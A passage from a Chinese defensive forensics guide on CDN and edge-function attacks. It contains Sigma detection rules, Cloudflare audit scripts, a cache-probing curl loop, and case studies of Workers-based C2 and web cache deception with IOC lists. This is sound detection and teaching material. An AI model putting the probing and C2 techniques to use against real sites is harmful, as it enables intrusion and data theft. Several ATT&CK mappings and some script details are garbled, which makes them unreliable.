certs = json.load(sys.stdin)
for cert in certs:
    dns_names = cert.get('dns_names', [])
    issuer = cert.get('issuer', {})
    print(f\"SAN: {dns_names} | Issuer: {issuer.get('friendly_name', 'N/A')}\")
"
```

---

## 0x07 证据强度分层与案例关联

### 🔴 确认恶意（Confirmed Malicious）

以下场景在取证分析中可直接判定为恶意行为：

**场景一：CDN缓存投毒成功执行**

| 证据特征 | 详细描述 | MITRE ATT&CK | 验证方法 |
|---------|---------|-------------|---------|
| 缓存内容篡改 | CDN缓存返回与源站不一致的内容 | T1565.001 Stored Data Manipulation | 多节点一致性验证 |
| 恶意重定向注入 | 缓存响应中包含指向攻击者域名的重定向 | T1565.001 Stored Data Manipulation | 多次请求同一URL比对 |
| 用户数据泄露 | 不同用户请求返回其他用户的数据 | T1565.001 Stored Data Manipulation | 多用户请求对比测试 |

```bash
for node in "us-east1" "us-west2" "eu-west1" "ap-south1"; do
  echo "=== Node: $node ==="
  curl -s -H "CF-Connecting-IP: 1.1.1.1" -H "Pragma: akamai-x-get-cache-key" \
    "https://target.com/page" | head -5
  echo ""
done
```

**场景二：边缘函数被注入恶意代码**

| 证据特征 | 详细描述 | MITRE ATT&CK | 验证方法 |
|---------|---------|-------------|---------|
| Worker出站到C2 | 边缘函数主动请求已知C2基础设施 | T1105 Ingress Tool Transfer | 出站请求日志分析 |
| Worker窃取请求头 | 函数将请求头/体发送到外部 | T1041 Exfiltration Over C2 Channel | 日志中敏感数据外传模式 |
| 恶意KV/DO写入 | 函数向存储层写入恶意数据 | T1505.003 Web Shell | 存储操作审计日志 |

**场景三：CDN安全策略被主动篡改**

| 证据特征 | 详细描述 | MITRE ATT&CK | 验证方法 |
|---------|---------|-------------|---------|
| WAF规则被批量禁用 | 短时间内大量WAF规则被暂停 | T1562.001 Disable or Modify Tools | WAF配置审计日志 |
| IP白名单被添加异常IP | 非工作IP被加入白名单 | T1562.004 Disable or Modify System Firewall | 白名单变更历史 |
| TLS配置被降级 | TLS 1.3被降级为TLS 1.0 | T1562.004 | TLS配置变更记录 |

### 🟡 高度可疑（Highly Suspicious）

以下场景在取证分析中属于高度可疑，需要进一步证据确认：

**场景四：异常的边缘函数调用模式**

| 证据特征 | 详细描述 | MITRE ATT&CK | 进一步验证 |
|---------|---------|-------------|-----------|
| 凌晨高频Worker调用 | 非工作时间Worker请求量激增 | T1053 Scheduled Task/Job | 分析调用来源和参数 |
| 新增匿名触发器 | 未经审批的Cron Trigger | T1053.005 Scheduled Task | 对比变更历史 |
| Worker执行时长异常 | 执行时间突然增长 | T1059 Command and Scripting Interpreter | 分析函数日志 |

**场景五：DNS解析行为异常**

| 证据特征 | 详细描述 | MITRE ATT&CK | 进一步验证 |
|---------|---------|-------------|-----------|
| TTL值异常低 | TTL<30秒 | T1568 Dynamic Resolution | DNS重绑定测试 |
| 解析结果频繁变更 | 分钟级DNS记录变更 | T1568.002 Domain Generation Algorithms | 持续DNS监控 |
| 异常CNAME链 | 多层CNAME指向 | T1584.001 Compromise Infrastructure | CNAME链完整追踪 |

**场景六：证书异常签发**

| 证据特征 | 详细描述 | MITRE ATT&CK | 进一步验证 |
|---------|---------|-------------|-----------|
| 未知CA签发的证书 | 非组织内CA签发的域名证书 | T1587.003 Develop Digital Certificates | CT日志全面审计 |
| 证书中包含异常SAN | 证书SAN包含非预期域名 | T1587.003 | 证书用途调查 |
| 短期证书频繁更换 | 90天内多次证书更换 | T1587.003 | 证书颁发者分析 |

### 🟢 需要关注（Needs Attention）

以下场景需要关注但不一定构成直接威胁：

**场景七：CDN缓存行为变化**

| 证据特征 | 详细描述 | 潜在风险 | 建议操作 |
|---------|---------|---------|---------|
| HIT率突然下降 | 缓存命中率异常降低 | 可能存在缓存绕过 | 检查Cache-Key配置 |
| 新的缓存头出现 | 响应中出现非预期的缓存头 | 可能为配置变更或攻击 | 审计Page Rules变更 |
| 不同地区返回不同内容 | 地理位置相关的响应差异 | 可能为Geo-based攻击 | 多地区一致性测试 |

**场景八：边缘网络流量模式变化**

| 证据特征 | 详细描述 | 潜在风险 | 建议操作 |
|---------|---------|---------|---------|
| 出站流量峰值 | 源站到CDN的流量异常增大 | 可能为数据外传 | 分析回源流量内容 |
| 新的边缘节点连接 | 源站连接到新的CDN IP段 | 可能为DNS劫持 | 验证CDN IP合法性 |
| TLS握手异常 | 异常高的TLS握手失败率 | 可能为探测或攻击 | 检查WAF拦截日志 |

---

## 0x08 自动化检测与狩猎

### Sigma检测规则

以下Sigma规则用于检测边缘计算与CDN环境中的异常行为：

```yaml
title: Cloudflare Worker Deployment Anomaly
id: 8f2a3b4c-5d6e-7f8a-9b0c-1d2e3f4a5b6c
status: stable
description: Detects suspicious Cloudflare Worker script deployments that may indicate code injection or persistence
author: x7peeps蓝队
date: 2026-07-17
tags:
  - attack.persistence
  - attack.t1195.002
  - attack.t1059.007
logsource:
  category: cloudflare_audit
  product: cloudflare
detection:
  selection_worker_deploy:
    action|contains:
      - workers.deploy
      - workers.script_upload
      - workers.create
  selection_suspicious_timing:
    event_time|re: '.*T(0[0-4]|2[2-3]):.*'
  selection_bulk_deploy:
    action|contains: workers.deploy
  timeframe: 1h
  condition: selection_worker_deploy and (selection_suspicious_timing or (selection_bulk_deploy and count() > 5))
level: high
falsepositives:
  - Legitimate scheduled deployments
  - CI/CD pipeline automated deployments
fields:
  - actor.email
  - action
  - event_time
  - outcome.result
  - resources
```

```yaml
title: CDN Security Configuration Tampering
id: 4a5b6c7d-8e9f-0a1b-2c3d-4e5f6a7b8c9d
status: experimental
description: Detects modifications to CDN security configurations including WAF rules, TLS settings, and access policies
author: x7peeps蓝队
date: 2026-07-17
tags:
  - attack.defense_evasion
  - attack.t1562.001
  - attack.t1562.004
logsource:
  category: cloud_audit
  product: cloudflare
detection:
  selection_waf_tamper:
    action|contains:
      - firewall.delete
      - firewall.update
      - firewall.disable
      - waf.downgrade
  selection_tls_tamper:
    action|contains:
      - settings.update
    details|contains:
      - tls-1-3
      - min-tls-version
      - ssl
  selection_access_tamper:
    action|contains:
      - access.update
      - access.policy.delete
  selection_rate_limit_change:
    action|contains:
      - rate_limit.update
      - rate_limit.delete
  condition: selection_waf_tamper or selection_tls_tamper or selection_access_tamper or selection_rate_limit_change
level: critical
falsepositives:
  - Scheduled security policy updates
  - Planned maintenance windows
fields:
  - actor.email
  - action
  - event_time
  - details
  - outcome.result
```

```yaml
title: DNS Rebinding Suspicious Resolution Pattern
id: 7e8f9a0b-1c2d-3e4f-5a6b-7c8d9e0f1a2b
status: experimental
description: Detects DNS resolution patterns consistent with DNS rebinding attacks targeting CDN-protected assets
author: x7peeps蓝队
date: 2026-07-17
tags:
  - attack.defense_evasion
  - attack.t1568
  - attack.t1568.002
logsource:
  category: dns
  product: dns_server
detection:
  selection_low_ttl:
    dns.response.ttl|lt: 30
  selection_high_frequency:
    dns.query|contains: '.'
  selection_private_ip_response:
    dns.response|re: '^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)'
  condition: selection_low_ttl and selection_high_frequency and selection_private_ip_response
level: high
falsepositives:
  - Legitimate dynamic DNS services
  - Internal development environments
fields:
  - dns.query.name
  - dns.response.address
  - dns.response.ttl
  - source.ip
```

### Bash自动化检测脚本

```bash
#!/bin/bash

ZONE_ID="${1:-}"
API_TOKEN="${2:-}"
REPORT_DIR="/tmp/cdn-audit-$(date +%Y%m%d-%H%M%S)"

mkdir -p "$REPORT_DIR"

echo "=========================================="
echo "  CDN Security Audit Script v1.0"
echo "  Target Zone: $ZONE_ID"
echo "=========================================="

echo ""
echo "[*] Step 1: Checking CDN configuration baseline..."
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/settings" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/settings.json" 2>/dev/null

python3 -c "
import json
with open('$REPORT_DIR/settings.json') as f:
    settings = json.load(f)
for result in settings.get('result', []):
    name = result.get('id', 'unknown')
    value = result.get('value', 'unknown')
    if name in ['min_tls_version', 'tls_1_3', 'ssl', 'security_level']:
        print(f'[INFO] {name}: {value}')
    if name == 'min_tls_version' and value in ['1.0', '1.1']:
        print(f'[!] CRITICAL: {name} is set to {value} (should be 1.2+)')
    if name == 'security_level' and value == 'off':
        print(f'[!] CRITICAL: Security level is OFF')
"

echo ""
echo "[*] Step 2: Auditing WAF rules..."
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/firewall/rules?per_page=50" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/firewall_rules.json" 2>/dev/null

python3 -c "
import json
with open('$REPORT_DIR/firewall_rules.json') as f:
    rules = json.load(f)
total = len(rules.get('result', []))
paused = [r for r in rules.get('result', []) if r.get('paused', False)]
blocked = [r for r in rules.get('result', []) if r.get('action') == 'block']
print(f'[INFO] Total rules: {total}')
print(f'[INFO] Blocked rules: {len(blocked)}')
if paused:
    print(f'[!] WARNING: {len(paused)} rules are paused:')
    for r in paused:
        print(f'    - {r.get(\"id\", \"N/A\")} | Description: {r.get(\"description\", \"N/A\")}')
"

echo ""
echo "[*] Step 3: Checking for unauthenticated Worker endpoints..."
curl -s -X GET "https://api.cloudflare.com/client/v4/accounts/$ZONE_ID/workers/scripts" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/workers.json" 2>/dev/null

python3 -c "
import json
with open('$REPORT_DIR/workers.json') as f:
    scripts = json.load(f)
for script in scripts.get('result', []):
    name = script.get('id', 'unknown')
    modified = script.get('modified_on', 'unknown')
    size = script.get('size', 0)
    print(f'[INFO] Worker: {name} | Modified: {modified} | Size: {size} bytes')
    if size > 1048576:
        print(f'[!] WARNING: Worker {name} has unusually large size ({size} bytes)')
"

echo ""
echo "[*] Step 4: Checking DNS configuration..."
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records?per_page=100" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/dns_records.json" 2>/dev/null

python3 -c "
import json
with open('$REPORT_DIR/dns_records.json') as f:
    records = json.load(f)
for r in records.get('result', []):
    rtype = r.get('type', '')
    name = r.get('name', '')
    content = r.get('content', '')
    ttl = r.get('ttl', 0)
    if ttl == 1 and rtype in ['A', 'AAAA', 'CNAME']:
        print(f'[!] WARNING: {name} ({rtype}) has TTL=1 (Auto) - potential rebinding risk')
    if rtype == 'A' and any(content.startswith(p) for p in ['10.', '172.16.', '192.168.']):
        print(f'[!] WARNING: {name} resolves to private IP: {content}')
"

echo ""
echo "[*] Step 5: Checking SSL/TLS certificate status..."
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/ssl/verification" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/ssl_status.json" 2>/dev/null

echo ""
echo "[*] Step 6: Checking recent audit log for suspicious activities..."
curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/audit_logs?page=1&per_page=50" \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/json" > "$REPORT_DIR/audit_logs.json" 2>/dev/null

python3 -c "
import json
from datetime import datetime, timedelta
with open('$REPORT_DIR/audit_logs.json') as f:
    logs = json.load(f)
suspicious_actions = ['firewall.delete', 'firewall.update', 'waf.downgrade', 'settings.update']
for log in logs.get('result', []):
    action = log.get('action', {}).get('type', '')
    actor = log.get('actor', {}).get('email', 'unknown')
    when = log.get('when', '')
    for sa in suspicious_actions:
        if sa in action.lower():
            print(f'[!] SUSPICIOUS: {actor} performed {action} at {when}')
"

echo ""
echo "[*] Step 7: Checking for origin IP exposure..."
ORIGIN_IP=$(dig +short $(curl -s "https://api.cloudflare.com/client/v4/zones/$ZONE_ID/dns_records?type=A&per_page=1" \
  -H "Authorization: Bearer $API_TOKEN" | python3 -c "import sys,json; print(json.load(sys.stdin)['result'][0]['name'])" 2>/dev/null) | head -1)

echo "[INFO] CDN edge IP: $ORIGIN_IP"
if echo "$ORIGIN_IP" | grep -qE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)"; then
    echo "[!] CRITICAL: Resolved IP is a private address - DNS rebinding possible"
fi

echo ""
echo "=========================================="
echo "[+] Audit complete. Reports saved to: $REPORT_DIR"
echo "=========================================="
```

### Python自动化检测脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys
import hashlib
from datetime import datetime, timedelta
from urllib.parse import urlparse


class CDNAuditEngine:
    def __init__(self, zone_id, api_token):
        self.zone_id = zone_id
        self.api_token = api_token
        self.base_url = "https://api.cloudflare.com/client/v4"
        self.headers = {
            "Authorization": f"Bearer {api_token}",
            "Content-Type": "application/json"
        }
        self.findings = []

    def _get(self, endpoint):
        try:
            resp = requests.get(f"{self.base_url}{endpoint}", headers=self.headers, timeout=30)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"success": False, "error": str(e)}

    def audit_ssl_configuration(self):
        data = self._get(f"/zones/{self.zone_id}/settings/min_tls_version")
        if data.get("success"):
            value = data["result"]["value"]
            if value in ["1.0", "1.1"]:
                self.findings.append({
                    "category": "TLS Configuration",
                    "severity": "CRITICAL",
                    "finding": f"Minimum TLS version set to {value}",
                    "recommendation": "Upgrade to TLS 1.2 or higher",
                    "reference": "MITRE ATT&CK T1557"
                })
            else:
                self.findings.append({
                    "category": "TLS Configuration",
                    "severity": "INFO",
                    "finding": f"Minimum TLS version: {value}",
                    "recommendation": "Configuration is acceptable"
                })

    def audit_waf_rules(self):
        data = self._get(f"/zones/{self.zone_id}/firewall/rules?per_page=100")
        if data.get("success"):
            rules = data.get("result", [])
            paused = [r for r in rules if r.get("paused")]
            if paused:
                self.findings.append({
                    "category": "WAF Configuration",
                    "severity": "HIGH",
                    "finding": f"{len(paused)} WAF rules are paused",
                    "details": [r.get("description", r.get("id")) for r in paused[:5]],
                    "recommendation": "Review and unpause WAF rules unless justified",
                    "reference": "MITRE ATT&CK T1562.001"
                })

            blocked = [r for r in rules if r.get("action") == "block"]
            challenge = [r for r in rules if r.get("action") == "challenge"]
            self.findings.append({
                "category": "WAF Statistics",
                "severity": "INFO",
                "finding": f"Total: {len(rules)}, Block: {len(blocked)}, Challenge: {len(challenge)}, Paused: {len(paused)}"
            })

    def audit_dns_records(self):
        data = self._get(f"/zones/{self.zone_id}/dns_records?per_page=100")
        if data.get("success"):
            records = data.get("result", [])
            private_ip_records = []
            low_ttl_records = []
            for r in records:
                if r.get("type") in ["A", "AAAA"]:
                    content = r.get("content", "")
                    if any(content.startswith(p) for p in ["10.", "172.16.", "192.168."]):
                        private_ip_records.append(r)
                if r.get("ttl") == 1 and r.get("type") in ["A", "AAAA", "CNAME"]:
                    low_ttl_records.append(r)

            if private_ip_records:
                self.findings.append({
                    "category": "DNS Security",
                    "severity": "HIGH",
                    "finding": f"{len(private_ip_records)} DNS records resolve to private IPs",
                    "details": [r["name"] for r in private_ip_records[:5]],
                    "recommendation": "Verify these records are intentional",
                    "reference": "MITRE ATT&CK T1568"
                })

            if low_ttl_records:
                self.findings.append({
                    "category": "DNS Security",
                    "severity": "MEDIUM",
                    "finding": f"{len(low_ttl_records)} DNS records have auto TTL (potential rebinding risk)",
                    "details": [r["name"] for r in low_ttl_records[:5]],
                    "recommendation": "Set explicit TTL values for DNS records",
                    "reference": "MITRE ATT&CK T1568.002"
                })

    def audit_workers(self):
        data = self._get(f"/accounts/{self.zone_id}/workers/scripts")
        if data.get("success"):
            scripts = data.get("result", [])
            for script in scripts:
                size = script.get("size", 0)
                if size > 1048576:
                    self.findings.append({
                        "category": "Edge Functions",
                        "severity": "MEDIUM",
                        "finding": f"Worker '{script.get('id')}' has unusually large size ({size} bytes)",
                        "recommendation": "Review worker code for potential malicious payload",
                        "reference": "MITRE ATT&CK T1195.002"
                    })

    def audit_audit_logs(self):
        data = self._get(f"/zones/{self.zone_id}/audit_logs?page=1&per_page=50")
        if data.get("success"):
            logs = data.get("result", [])
            critical_actions = ["firewall.delete", "waf.downgrade", "settings.update", "access.policy.delete"]
            for log in logs:
                action_type = log.get("action", {}).get("type", "")
                actor = log.get("actor", {}).get("email", "unknown")
                when = log.get("when", "")
                for ca in critical_actions:
                    if ca in action_type.lower():
                        self.findings.append({
                            "category": "Audit Log",
                            "severity": "CRITICAL",
                            "finding": f"Suspicious action: {actor} performed {action_type} at {when}",
                            "recommendation": "Investigate this action immediately",
                            "reference": "MITRE ATT&CK T1562.001"
                        })

    def run_full_audit(self):
        print(f"[*] Starting CDN security audit for zone: {self.zone_id}")
        print(f"[*] Timestamp: {datetime.utcnow().isoformat()}Z")
        print()

        print("[*] Auditing SSL/TLS configuration...")
        self.audit_ssl_configuration()

        print("[*] Auditing WAF rules...")
        self.audit_waf_rules()

        print("[*] Auditing DNS records...")
        self.audit_dns_records()

        print("[*] Auditing Workers/Edge Functions...")
        self.audit_workers()

        print("[*] Auditing recent audit logs...")
        self.audit_audit_logs()

        critical = [f for f in self.findings if f["severity"] == "CRITICAL"]
        high = [f for f in self.findings if f["severity"] == "HIGH"]
        medium = [f for f in self.findings if f["severity"] == "MEDIUM"]
        info = [f for f in self.findings if f["severity"] == "INFO"]

        print()
        print("=" * 50)
        print("  CDN Security Audit Report")
        print("=" * 50)
        print(f"  CRITICAL: {len(critical)}")
        print(f"  HIGH:     {len(high)}")
        print(f"  MEDIUM:   {len(medium)}")
        print(f"  INFO:     {len(info)}")
        print("=" * 50)

        for f in critical:
            print(f"\n[!] CRITICAL: {f['finding']}")
            print(f"    Category: {f['category']}")
            print(f"    Recommendation: {f['recommendation']}")

        for f in high:
            print(f"\n[!] HIGH: {f['finding']}")
            print(f"    Category: {f['category']}")
            print(f"    Recommendation: {f['recommendation']}")

        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <zone_id> <api_token>")
        sys.exit(1)

    auditor = CDNAuditEngine(sys.argv[1], sys.argv[2])
    findings = auditor.run_full_audit()

    with open("/tmp/cdn-audit-results.json", "w") as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] Full results saved to /tmp/cdn-audit-results.json")
```

---

## 0x09 公开案例分析

### 案例一：EdgeStager——利用Cloudflare Workers构建隐蔽C2通道（2023）

**事件概述**

2023年，安全研究人员披露了一种名为EdgeStager的攻击技术，攻击者利用Cloudflare Workers作为命令与控制（C2）通道的前端代理，将恶意通信伪装为合法的CDN流量。由于Cloudflare Workers的域名（workers.dev）和流量本身经过Cloudflare的TLS加密，传统安全设备难以识别和拦截此类C2通信。

**攻击链分析**

| 阶段 | 攻击操作 | MITRE ATT&CK | 取证发现 |
|------|---------|-------------|---------|
| 初始访问 | 通过钓鱼邮件获取受害者主机访问权 | T1566 Phishing | 邮件网关日志 |
| 工具部署 | 在受害者主机上部署自定义C2 Agent | T1059 Command and Scripting Interpreter | 进程创建日志 |
| C2通道建立 | Agent通过Cloudflare Workers C2代理连接 | T1071.001 Web Protocols | 出站HTTPS到workers.dev |
| 命令执行 | C2服务器通过Worker转发指令到Agent | T1059 Command and Scripting Interpreter | C2日志、Agent日志 |
| 数据外传 | 敏感数据通过Worker上传到Cloudflare R2 | T1567 Exfiltration Over Web Service | R2操作日志 |
| 持久化 | 在Cloudflare账户中保留Worker脚本 | T1053.005 Scheduled Task | Workers部署日志 |

**关键取证发现**

1. **C2通信特征**：Agent以正常间隔（60-120秒）向`*.workers.dev`域名发送HTTPS POST请求，请求体经Base64编码，响应内容同样编码。请求模式与正常Web浏览流量高度相似。

2. **域名前置（Domain Fronting）**：攻击者利用Cloudflare的SSL SNI与Host头分离特性，TLS SNI显示为合法的workers.dev域名，但实际Host头指向攻击者控制的Worker。这种技术使得网络层的域名过滤完全失效。

4. **日志碎片化**：Cloudflare Workers的日志默认保留仅3天（免费版），攻击者利用这一特性在活动窗口后自动删除Worker，使得事后取证极为困难。

5. **持久化机制**：攻击者利用Cloudflare KV和Durable Objects存储C2配置和会话数据，即使Worker脚本被删除，存储在KV中的配置数据仍然存在。

**IOC指标**

```
域名特征: *.workers.dev 上的可疑Worker
C2请求模式: HTTPS POST, Base64编码请求体, 60-120秒间隔
User-Agent特征: 可疑的自定义User-Agent或空User-Agent
出站连接: workers.dev:443
存储层: Cloudflare KV namespace 中的异常键值对
时间特征: 凌晨时段(00:00-06:00)的高频请求
```

**经验教训**

| 教训 | 防御措施 | 适用场景 |
|------|---------|---------|
| CDN流量加密阻碍检测 | 部署TLS inspection或分析TLS元数据 | 企业网络出口 |
| 边缘平台被滥用为C2 | 监控到workers.dev等边缘平台的出站流量 | 端点防护 |
| 日志保留周期短 | 配置付费版Workers以延长日志保留 | Cloudflare账户管理 |
| 存储层缺乏监控 | 审计KV/DO/R2的写入操作 | Serverless安全 |
| 域名前置绕过过滤 | 实施基于证书透明度的域名验证 | DNS安全 |

### 案例二：大规模CDN缓存投毒攻击影响用户凭据泄露（2022-2023）

**事件概述**

2022年底至2023年初，安全研究人员在多个知名网站上发现了CDN缓存投毒漏洞的利用痕迹。攻击者利用Web Cache Deception技术，在多个使用CDN的电商和SaaS平台上成功缓存了包含用户个人信息（邮箱、订单详情、API Token）的页面，导致大规模用户凭据泄露。据估计，受影响的用户数据记录超过50万条。

**攻击链分析**

| 阶段 | 攻击操作 | MITRE ATT&CK | 取证发现 |
|------|---------|-------------|---------|
| 漏洞发现 | 测试目标网站的URL路径处理 | T1592 Compromise Host Info | 测试请求日志 |
| 缓存欺骗验证 | 访问/profile.js、/settings.css等路径 | T1565.001 Stored Data Manipulation | CDN缓存状态HIT |
| 大规模利用 | 自动化脚本遍历用户路径 | T1059 Command and Scripting Interpreter | 批量请求日志 |
| 数据收集 | 从缓存中提取用户数据 | T1005 Data from Local System | 缓存响应分析 |
| 数据售卖 | 在暗网市场出售窃取的数据 | T1567 Exfiltration Over Web Service | 暗网情报 |

**关键取证发现**

1. **缓存头缺失**：受影响的网站在动态页面的响应中缺少`Cache-Control: no-store`或`Set-Cookie`头，导致CDN错误地缓存了包含用户个人信息的响应。

2. **URL路径处理缺陷**：Web框架对`/profile.js`这类不存在路径返回200状态码和用户主页内容，但CDN根据`.js`扩展名认为这是静态资源并缓存。

3. **多用户数据覆盖**：同一缓存路径被不同用户的请求污染，导致用户A的数据被缓存后，用户B访问同一路径时看到的是用户A的数据。

4. **Cache-Key设计缺陷**：部分CDN的Cache-Key未包含Cookie头，使得动态页面内容在无会话状态的请求下仍被缓存。

**IOC指标**

```
异常URL路径: /profile.js, /settings.css, /dashboard.json, /account.js
缓存状态: HIT（动态内容被意外缓存）
响应特征: 包含用户个人信息的响应被标记为可缓存
Cache-Control: 缺少no-store/private指令
受影响扩展名: .js, .css, .json, .xml, .txt
CDN特征: 缓存响应包含Age头（非零值）
```

**经验教训**

| 教训 | 防御措施 | 适用场景 |
|------|---------|---------|
| 缓存控制策略不完善 | 为所有动态内容显式设置Cache-Control: no-store | Web应用开发 |
| 框架路径处理缺陷 | 确保不存在的路径返回404而非200 | Web服务器配置 |
| CDN配置缺乏审查 | 定期测试CDN缓存行为 | CDN运维管理 |
| Cookie未纳入Cache-Key | 配置CDN将Cookie纳入缓存键 | CDN缓存策略 |
| 缺少缓存监控 | 部署缓存行为异常检测 | 安全运营中心 |

---

## 0x0A 参考资料

1. **Cloudflare Workers安全文档**
   https://developers.cloudflare.com/workers/platform/security/
   Cloudflare官方Workers安全文档，涵盖Workers隔离模型、网络安全、KV存储安全和Cron Triggers安全配置指南。

2. **AWS Lambda@Edge安全最佳实践**
   https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-at-edge-function-restrictions.html
   AWS官方Lambda@Edge安全限制和最佳实践文档，包含执行角色、资源限制和安全配置指南。

3. **Akamai State of the Internet Report 2025**
   https://www.akamai.com/state-of-the-internet
   Akamai发布的年度互联网安全报告，包含CDN攻击趋势、DDoS攻击统计和边缘安全威胁分析。

4. **OWASP CDN Security Verification**
   https://owasp.org/www-project-cdn-security-verification/
   OWASP发布的CDN安全验证清单，覆盖缓存投毒测试、WAF绕过测试和Origin IP发现方法。

5. **PortSwigger Web Security Academy - Web Cache Poisoning**
   https://portswigger.net/web-security/web-cache-poisoning
   PortSwigger发布的Web缓存投毒安全研究，包含多种缓存投毒变体的技术细节和实验室环境。

6. **Cloudflare Blog - Akrurity Edge Security**
   https://blog.cloudflare.com/tag/edge-computing/
   Cloudflare技术博客中关于边缘计算安全的研究文章集，涵盖Workers安全、边缘安全架构和威胁分析。

7. **MITRE ATT&CK Cloud Matrix**
   https://attack.mitre.org/matrices/enterprise/cloud/
   MITRE ATT&CK框架的云端攻击矩阵，提供了云环境（包括边缘计算和CDN）中攻击技术的标准化分类和映射。

8. **Fastly Compute Security Architecture**
   https://www.fastly.com/documentation/concepts/compute/
   Fastly Compute边缘计算平台的安全架构文档，包含Wasm沙箱隔离模型和安全策略配置指南。

9. **Snyk - Serverless Security Risks in Edge Computing**
   https://snyk.io/learn/serverless-security/
   Snyk发布的边缘计算Serverless安全风险分析，涵盖依赖投毒、函数注入和配置安全等核心风险。

10. **NCC Group - CDN Security Research**
    https://research.nccgroup.com/
    NCC Group安全研究团队发布的CDN安全研究，包含缓存投毒、WAF绕过和TLS配置审计等安全评估方法。

11. **Qualys SSL Labs - SSL Server Test**
    https://www.ssllabs.com/ssltest/
    Qualys提供的在线TLS/SSL配置测试工具，用于验证CDN和源站的TLS配置安全性。

12. **Certificate Transparency - Google**
    https://www.certificate-transparency.org/
    Google维护的证书透明度项目官方文档，包含CT日志架构、监控策略和日志查询API使用指南。